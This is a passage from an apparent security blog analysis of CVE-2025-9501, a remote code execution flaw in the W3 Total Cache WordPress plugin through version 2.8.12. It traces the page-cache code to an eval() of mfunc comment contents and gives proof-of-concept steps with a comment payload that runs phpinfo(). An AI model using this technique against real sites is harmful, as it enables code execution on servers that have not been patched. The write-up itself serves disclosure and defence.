</span></span><span class="line"><span class="cl">		<span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;W3TC_DIR&#39;</span><span class="p">,</span> <span class="p">(</span> <span class="nx">defined</span><span class="p">(</span> <span class="s1">&#39;WP_PLUGIN_DIR&#39;</span> <span class="p">)</span> <span class="o">?</span> <span class="nx">WP_PLUGIN_DIR</span> <span class="o">:</span> <span class="nx">WP_CONTENT_DIR</span> <span class="o">.</span> <span class="s1">&#39;/plugins&#39;</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/w3-total-cache&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="o">@</span><span class="nx">is_dir</span><span class="p">(</span> <span class="nx">W3TC_DIR</span> <span class="p">)</span> <span class="o">||</span> <span class="o">!</span> <span class="nx">file_exists</span><span class="p">(</span> <span class="nx">W3TC_DIR</span> <span class="o">.</span> <span class="s1">&#39;/w3-total-cache-api.php&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span> <span class="nx">defined</span><span class="p">(</span> <span class="s1">&#39;WP_ADMIN&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">printf</span><span class="p">(</span> <span class="s1">&#39;&lt;strong&gt;W3 Total Cache Error:&lt;/strong&gt; some files appear to be missing or out of place. Please re-install plugin or remove &lt;strong&gt;%s&lt;/strong&gt;. &lt;br /&gt;&#39;</span><span class="p">,</span> <span class="no">__FILE__</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">require_once</span> <span class="nx">W3TC_DIR</span> <span class="o">.</span> <span class="s1">&#39;/w3-total-cache-api.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span> <span class="nx">class_exists</span><span class="p">(</span> <span class="s1">&#39;\W3TC\Dispatcher&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$w3tc_redirect</span> <span class="o">=</span> <span class="nx">\W3TC\Dispatcher</span><span class="o">::</span><span class="na">component</span><span class="p">(</span> <span class="s1">&#39;Mobile_Redirect&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$w3tc_redirect</span><span class="o">-&gt;</span><span class="na">process</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="nv">$w3tc_config</span> <span class="o">=</span> <span class="nx">\W3TC\Dispatcher</span><span class="o">::</span><span class="na">config</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span> <span class="nv">$w3tc_config</span><span class="o">-&gt;</span><span class="na">get_boolean</span><span class="p">(</span> <span class="s1">&#39;pgcache.enabled&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="nv">$o</span> <span class="o">=</span> <span class="nx">\W3TC\Dispatcher</span><span class="o">::</span><span class="na">component</span><span class="p">(</span> <span class="s1">&#39;PgCache_ContentGrabber&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">				<span class="nv">$o</span><span class="o">-&gt;</span><span class="na">process</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>When page cache (<code>pgcache</code>) is enabled, <code>$o-&gt;process()</code> handles page cache logic.</p>
<p><figure><a class="lightgallery" href="/posts/2025-11-22-cve-2025-9501/page_cache.png" title="Enable page cache" data-thumbnail="/posts/2025-11-22-cve-2025-9501/page_cache.png" data-sub-html="<h2>Page Cache</h2><p>Enable page cache</p>"><img loading="lazy" src='/posts/2025-11-22-cve-2025-9501/page_cache.png' alt="Page Cache" height="593" width="1227"></a><figcaption class="image-caption">Enable page cache</figcaption>
  </figure></p>
<p>In <code>process()</code>, the plugin prepares a mechanism to intercept page content before sending it to the browser:</p>
<div class="highlight" title="PgCache_ContentGrabber.php v2.8.12" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="hl"><span class="lnt">5
</span></span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">process</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">run_extensions_dropin</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Util_Bus</span><span class="o">::</span><span class="na">add_ob_callback</span><span class="p">(</span> <span class="s1">&#39;pagecache&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span> <span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;ob_callback&#39;</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line hl"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>This registers a callback:</p>
<div class="highlight" title="PgCache_ContentGrabber.php v2.8.12" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Util_Bus</span><span class="o">::</span><span class="na">add_ob_callback</span><span class="p">(</span> <span class="s1">&#39;pagecache&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span> <span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;ob_callback&#39;</span> <span class="p">)</span> <span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Meaning:</p>
<ul>
<li>Plugin registers a callback named <code>pagecache</code>.</li>
<li>The callback is the <code>ob_callback</code> method of the current object.</li>
<li>This is executed <strong>after WordPress generates the full HTML</strong>, allowing the plugin to process it (optimize, compress, cache) before sending it to the client.</li>
</ul>
<p><code>add_ob_callback()</code> simply stores the callback:</p>
<div class="highlight" title="Util_Bus.php v2.8.12" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="hl"><span class="lnt">2
</span></span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">add_ob_callback</span><span class="p">(</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$callback</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">    <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;_w3tc_ob_callbacks&#39;</span><span class="p">][</span> <span class="nv">$key</span> <span class="p">]</span> <span class="o">=</span> <span class="nv">$callback</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>ob_callback()</code> is triggered when the output buffer is flushed, checking for dynamic content:</p>
<div class="highlight" title="PgCache_ContentGrabber.php v2.8.12" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="hl"><span class="lnt"> 3
</span></span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="hl"><span class="lnt"> 6
</span></span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">ob_callback</span><span class="p">(</span> <span class="nv">$buffer</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line hl"><span class="cl">    <span class="nv">$has_dynamic</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_has_dynamic</span><span class="p">(</span> <span class="nv">$buffer</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nv">$has_dynamic</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_shutdown_buffer</span> <span class="o">=</span> <span class="nv">$buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$buffer</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">register_shutdown_function</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;shutdown&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><ol>
<li><code>$buffer</code> contains the full HTML WordPress generated.</li>
<li><code>_has_dynamic()</code> checks for non-cacheable sections:</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">_has_dynamic</span><span class="p">(</span> <span class="nv">$buffer</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">defined</span><span class="p">(</span> <span class="s1">&#39;W3TC_DYNAMIC_SECURITY&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;~&lt;!--\s*m(func|clude)\s*&#39;</span> <span class="o">.</span> <span class="nx">W3TC_DYNAMIC_SECURITY</span> <span class="o">.</span> <span class="s1">&#39;(.*)--&gt;(.*)&lt;!--\s*/m(func|clude)\s*&#39;</span> <span class="o">.</span> <span class="nx">W3TC_DYNAMIC_SECURITY</span> <span class="o">.</span> <span class="s1">&#39;\s*--&gt;~Uis&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$buffer</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Dynamic content format:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;!--</span> <span class="nx">mfunc</span><span class="p">{</span><span class="nx">W3TC_DYNAMIC_SECURITY_VALUE</span><span class="p">}</span> <span class="o">--&gt;</span> <span class="nx">PHP</span> <span class="nx">code</span> <span class="o">&lt;!--</span> <span class="o">/</span><span class="nx">mfunc</span><span class="p">{</span><span class="nx">W3TC_DYNAMIC_SECURITY_VALUE</span><span class="p">}</span> <span class="o">--&gt;</span>
</span></span><span class="line"><span class="cl"><span class="k">or</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;!--</span> <span class="nx">mclude</span><span class="p">{</span><span class="nx">W3TC_DYNAMIC_SECURITY_VALUE</span><span class="p">}</span> <span class="o">--&gt;</span> <span class="nx">PHP</span> <span class="nx">code</span> <span class="o">&lt;!--</span> <span class="o">/</span><span class="nx">mclude</span><span class="p">{</span><span class="nx">W3TC_DYNAMIC_SECURITY_VALUE</span><span class="p">}</span> <span class="o">--&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><ol start="3">
<li>
<p>If no dynamic content → return buffer directly to cache.</p>
</li>
<li>
<p>If dynamic content:</p>
<ul>
<li>Save full HTML to <code>_shutdown_buffer</code></li>
<li>Return empty string temporarily</li>
<li>Register <code>shutdown()</code> to process after PHP request finishes</li>
</ul>
</li>
</ol>
<div class="highlight" title="PgCache_ContentGrabber.php v2.8.12" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="hl"><span class="lnt">5
</span></span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">shutdown</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$compression</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_page_key_extension</span><span class="p">[</span><span class="s1">&#39;compression&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$buffer</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_parse_dynamic</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_shutdown_buffer</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$compressed_buffer</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_compress</span><span class="p">(</span> <span class="nv">$buffer</span><span class="p">,</span> <span class="nv">$compression</span> <span class="p">);</span>
</span></span><span class="line hl"><span class="cl">    <span class="k">echo</span> <span class="nv">$compressed_buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>shutdown()</code> calls <code>_parse_dynamic()</code> to process dynamic HTML blocks and replace them with executed results:</p>
<div class="highlight" title="PgCache_ContentGrabber.php v2.8.12" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="hl"><span class="lnt">7
</span></span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">_parse_dynamic</span><span class="p">(</span> <span class="nv">$buffer</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">defined</span><span class="p">(</span> <span class="s1">&#39;W3TC_DYNAMIC_SECURITY&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="nv">$buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$buffer</span> <span class="o">=</span> <span class="nx">preg_replace_callback</span><span class="p">(</span><span class="s1">&#39;~&lt;!--\s*mfunc\s*&#39;</span> <span class="o">.</span> <span class="nx">W3TC_DYNAMIC_SECURITY</span> <span class="o">.</span> <span class="s1">&#39;(.*)--&gt;(.*)&lt;!--\s*/mfunc\s*&#39;</span> <span class="o">.</span> <span class="nx">W3TC_DYNAMIC_SECURITY</span> <span class="o">.</span> <span class="s1">&#39;\s*--&gt;~Uis&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;_parse_dynamic_mfunc&#39;</span><span class="p">),</span> <span class="nv">$buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$buffer</span> <span class="o">=</span> <span class="nx">preg_replace_callback</span><span class="p">(</span><span class="s1">&#39;~&lt;!--\s*mclude\s*&#39;</span> <span class="o">.</span> <span class="nx">W3TC_DYNAMIC_SECURITY</span> <span class="o">.</span> <span class="s1">&#39;(.*)--&gt;(.*)&lt;!--\s*/mclude\s*&#39;</span> <span class="o">.</span> <span class="nx">W3TC_DYNAMIC_SECURITY</span> <span class="o">.</span> <span class="s1">&#39;\s*--&gt;~Uis&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;_parse_dynamic_mclude&#39;</span><span class="p">),</span> <span class="nv">$buffer</span><span class="p">);</span>
</span></span><span class="line hl"><span class="cl">    <span class="k">return</span> <span class="nv">$buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Each matched block is replaced by the executed content, ready for compression and output.</p>
<h2 class="heading-element" id="flow"><span>Flow</span>
  <a href="#flow" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="diagram-container">
  <pre class="mermaid">
graph TD

A["User requests any front‑end page (unauthenticated)"]
--> B["WordPress loads wp-settings.php"]
B --> C["WP_CACHE = true → Load advanced-cache.php"]
C --> D["advanced-cache.php runs Dispatcher"]
D --> E["PgCache_ContentGrabber->process()"]
E --> F["Util_Bus::add_ob_callback('pagecache', 'ob_callback')"]
F --> G["WordPress renders full HTML into output buffer"]
G --> H["ob_callback($buffer) triggered"]
H --> I{"_has_dynamic($buffer) ?"}
I -->|No| J["Return buffer as-is → Serve cached page"]
I -->|Yes| K["Save buffer to _shutdown_buffer"]
K --> L["register_shutdown_function(shutdown)"]
L --> M["After request completes → shutdown()"]
M --> N["_parse_dynamic(_shutdown_buffer)"]
N --> O{"HTML contains <!-- mfunc ... --> ?"}
O -->|Yes| P["_parse_dynamic_mfunc()"]
P --> Q["Extract payload from comment and run eval()"]
O -->|Or mclude| R["_parse_dynamic_mclude() (include type)"]
Q --> S["Output replaced with execution result"]
R --> S
S --> T["Page optionally compressed"]
T --> U["echo back to user"]
</pre>
  <pre class="mermaid-dark">
graph TD

A["User requests any front‑end page (unauthenticated)"]
--> B["WordPress loads wp-settings.php"]
B --> C["WP_CACHE = true → Load advanced-cache.php"]
C --> D["advanced-cache.php runs Dispatcher"]
D --> E["PgCache_ContentGrabber->process()"]
E --> F["Util_Bus::add_ob_callback('pagecache', 'ob_callback')"]
F --> G["WordPress renders full HTML into output buffer"]
G --> H["ob_callback($buffer) triggered"]
H --> I{"_has_dynamic($buffer) ?"}
I -->|No| J["Return buffer as-is → Serve cached page"]
I -->|Yes| K["Save buffer to _shutdown_buffer"]
K --> L["register_shutdown_function(shutdown)"]
L --> M["After request completes → shutdown()"]
M --> N["_parse_dynamic(_shutdown_buffer)"]
N --> O{"HTML contains <!-- mfunc ... --> ?"}
O -->|Yes| P["_parse_dynamic_mfunc()"]
P --> Q["Extract payload from comment and run eval()"]
O -->|Or mclude| R["_parse_dynamic_mclude() (include type)"]
Q --> S["Output replaced with execution result"]
R --> S
S --> T["Page optionally compressed"]
T --> U["echo back to user"]
</pre>
  <pre class="mermaid-neutral">
graph TD

A["User requests any front‑end page (unauthenticated)"]
--> B["WordPress loads wp-settings.php"]
B --> C["WP_CACHE = true → Load advanced-cache.php"]
C --> D["advanced-cache.php runs Dispatcher"]
D --> E["PgCache_ContentGrabber->process()"]
E --> F["Util_Bus::add_ob_callback('pagecache', 'ob_callback')"]
F --> G["WordPress renders full HTML into output buffer"]
G --> H["ob_callback($buffer) triggered"]
H --> I{"_has_dynamic($buffer) ?"}
I -->|No| J["Return buffer as-is → Serve cached page"]
I -->|Yes| K["Save buffer to _shutdown_buffer"]
K --> L["register_shutdown_function(shutdown)"]
L --> M["After request completes → shutdown()"]
M --> N["_parse_dynamic(_shutdown_buffer)"]
N --> O{"HTML contains <!-- mfunc ... --> ?"}
O -->|Yes| P["_parse_dynamic_mfunc()"]
P --> Q["Extract payload from comment and run eval()"]
O -->|Or mclude| R["_parse_dynamic_mclude() (include type)"]
Q --> S["Output replaced with execution result"]
R --> S
S --> T["Page optionally compressed"]
T --> U["echo back to user"]
</pre><div class="diagram-copy-btn" aria-label="Copy Mermaid code" role="button"><i class="fa-regular fa-clone" aria-hidden="true"></i><i class="fa-solid fa-check text-success" aria-hidden="true"></i></div>
<template><pre>
graph TD

A["User requests any front‑end page (unauthenticated)"]
--> B["WordPress loads wp-settings.php"]
B --> C["WP_CACHE = true → Load advanced-cache.php"]
C --> D["advanced-cache.php runs Dispatcher"]
D --> E["PgCache_ContentGrabber->process()"]
E --> F["Util_Bus::add_ob_callback('pagecache', 'ob_callback')"]
F --> G["WordPress renders full HTML into output buffer"]
G --> H["ob_callback($buffer) triggered"]
H --> I{"_has_dynamic($buffer) ?"}
I -->|No| J["Return buffer as-is → Serve cached page"]
I -->|Yes| K["Save buffer to _shutdown_buffer"]
K --> L["register_shutdown_function(shutdown)"]
L --> M["After request completes → shutdown()"]
M --> N["_parse_dynamic(_shutdown_buffer)"]
N --> O{"HTML contains <!-- mfunc ... --> ?"}
O -->|Yes| P["_parse_dynamic_mfunc()"]
P --> Q["Extract payload from comment and run eval()"]
O -->|Or mclude| R["_parse_dynamic_mclude() (include type)"]
Q --> S["Output replaced with execution result"]
R --> S
S --> T["Page optionally compressed"]
T --> U["echo back to user"]
</pre></template>
</div>
<h2 class="heading-element" id="proof-of-concept-poc"><span>Proof of Concept (PoC)</span>
  <a href="#proof-of-concept-poc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ol>
<li>Install and activate the plugin.</li>
<li>Enable Page Cache.</li>
<li>Configure <code>W3TC_DYNAMIC_SECURITY</code> in <code>wp-config.php</code>.</li>
<li>Comment on any post:</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;!--</span> <span class="nx">mfuncvalue</span> <span class="o">--&gt;</span><span class="nx">phpinfo</span><span class="p">();</span><span class="o">&lt;!--</span> <span class="o">/</span><span class="nx">mfuncvalue</span> <span class="o">--&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="/posts/2025-11-22-cve-2025-9501/result.png" title="Result" data-thumbnail="/posts/2025-11-22-cve-2025-9501/result.png" data-sub-html="<h2>Result</h2><p>Result</p>"><img loading="lazy" src='/posts/2025-11-22-cve-2025-9501/result.png' alt="Result" height="1078" width="1918"></a><figcaption class="image-caption">Result</figcaption>
  </figure></p>
<blockquote>
<p><strong>NOTE</strong>
The value of <code>W3TC_DYNAMIC_SECURITY</code> may be exposed if you forget to enable Page Cache and use it in a place where an Unauthenticated User can see it.
<figure><a class="lightgallery" href="/posts/2025-11-22-cve-2025-9501/miss_page_cache.png" title="Used when Page Cache is forgotten to be enabled" data-thumbnail="/posts/2025-11-22-cve-2025-9501/miss_page_cache.png" data-sub-html="<h2>Miss Page Cache</h2><p>Used when Page Cache is forgotten to be enabled</p>"><img loading="lazy" src='/posts/2025-11-22-cve-2025-9501/miss_page_cache.png' alt="Miss Page Cache" height="259" width="427"></a><figcaption class="image-caption">Used when Page Cache is forgotten to be enabled</figcaption>
  </figure></p>
</blockquote>
<h1 class="heading-element" id="conclusion"><span>Conclusion</span>
  <a href="#conclusion" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>CVE-2025-9501 arises because W3 Total Cache executes PHP in “dynamic fragment caching” (<code>&lt;!-- mfunc ... --&gt;</code>) via <code>eval()</code> without any validation or sandboxing. This allows unauthenticated attackers to inject PHP code that runs during <code>shutdown()</code>, after WordPress completes the main request, leading to Remote Code Execution (RCE). The risk is heightened because cache and output handling occur outside normal WordPress lifecycle, bypassing hooks, nonces, and access checks. Version 2.8.13 removes the <code>eval()</code> call, fixing the vulnerability.</p>
<h1 class="heading-element" id="key-takeaways"><span>Key Takeaways</span>
  <a href="#key-takeaways" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><ul>
<li>Using <code>eval()</code> in production code almost always results in RCE if input is uncontrolled.</li>
<li>The plugin processes dynamic content <strong>after the full WordPress lifecycle</strong>, bypassing many core protections.</li>
<li>W3TC Page Fragment Caching allows PHP execution from HTML comments; misconfiguration or missing validation enables attacks.</li>
<li>RCE triggers in <code>register_shutdown_function()</code>, executing at the end of the request, making detection harder.</li>
<li>Immediate plugin update is mandatory for systems using &lt;= 2.8.12.</li>
<li>Avoid <code>eval()</code> in PHP unless strictly sandboxed and validated.</li>
</ul>
<h2 class="heading-element" id="references"><span>References</span>
  <a href="#references" class="heading-mark">
